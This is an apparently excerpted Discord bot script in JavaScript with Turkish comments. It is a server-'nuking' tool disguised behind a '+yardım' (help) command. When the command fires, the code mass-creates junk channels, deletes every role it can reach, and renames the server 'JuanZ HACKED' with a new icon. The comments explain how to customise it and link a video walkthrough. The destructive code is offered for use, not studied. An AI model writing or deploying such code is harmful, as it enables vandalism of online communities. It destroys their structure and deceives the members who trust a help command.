...
client.on("message", async msg => {
  if (msg.content === "+yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    ...
    await msg.guild.createChannel("JuanZ", {
      type: "text"
    });
      await msg.guild
      .createChannel("JuanZ", {
      ...
      .then(chan => {
        chan.setUserLimit("1");
            ...
            await msg.guild
      .createChannel("JuanZ", { ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
    ...
    await msg.guild.setIcon("https://i.hizliresim.com/13xJyG.jpg");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
    await msg.guild.setName("JuanZ HACKED"); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
    await client.user.setAvatar("https://i.hizliresim.com/13xJyG.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
    await client.user.setUsername("JuanZ BOT");    //BOTUN ISMİNİ DEGISTIRIR
